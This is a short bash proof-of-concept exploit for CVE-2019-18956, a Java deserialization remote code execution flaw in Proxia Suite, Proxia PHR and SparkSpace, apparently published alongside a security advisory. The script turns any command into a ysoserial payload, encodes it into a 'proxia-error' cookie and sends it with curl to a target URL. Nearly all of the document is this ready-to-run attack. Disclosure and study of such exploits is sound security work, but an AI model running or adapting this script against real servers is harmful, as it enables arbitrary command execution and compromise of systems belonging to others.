#!/bin/bash
#
# CVE-2019-18956 - Remote Code Execution (Java Deserialization) in Proxia Suite, Proxia PHR & SparkSpace
#
# Software: 
#      Proxia Suite 10.1; < 10.1.5
#      Proxia Suite 10.0; < 10.0.32
#      Proxia Suite 9; < 9.12.16, 9.11.19, 9.10.26, 9.9.8, 9.8.43 & 9.7.10;
#      SparkSpace 1.2; < 1.2.4
#      SparkSpace 1.1; < 1.1.2
#      SparkSpace 1.0; < 1.0.30
#      Proxia PHR 1.1; < 1.1.2
#      Proxia PHR 1.0; < 1.0.30
#
# Author:   Pablo Martinez (@xassiz) from BlackArrow
# Details:  https://github.com/blackarrowsec/advisories/tree/master/2019/CVE-2019-18956
# Web:      [www.blackarrow.net] - [www.tarlogic.com]
#

die_help () {
    echo "Usage: ${0} url ysoserial_payload cmd"
    exit 1
}

[ "${#}" -eq "3" ] || die_help


echo "[+] Target: ${1}"
echo "[+] Payload: ${2}"
echo "[+] Cmd: ${3}"

PAYLOAD="$(java -jar "ysoserial.jar" "${2}" "${3}" | tr -d '\0')"

if [ "${?}" -eq "0" ]
then
    curl -I -k "${1}" --cookie "proxia-error=$(gzip <<< "${PAYLOAD}" | base64 -w0 | tr '/' '-' | tr '+' '_' | tr '=' '.')"
fi
